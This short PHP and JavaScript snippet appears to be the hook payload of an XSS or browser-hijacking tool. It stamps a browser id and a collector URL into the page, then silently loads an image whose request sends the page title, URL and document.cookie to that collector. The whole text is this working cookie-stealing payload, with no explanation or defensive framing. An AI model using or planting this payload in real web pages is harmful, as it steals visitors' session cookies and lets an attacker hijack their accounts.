<?php  echo  "var  bid={$browser->bid}; var xingUrl='".SITE_ROOT."index.php';"  ?>

 (function() { (new Image()).src =  xingUrl+"?bid="+bid+"&a=info&title="+document.title+"&url=" + escape(document.URL)+'&cookie=' + escape(document.cookie);
})();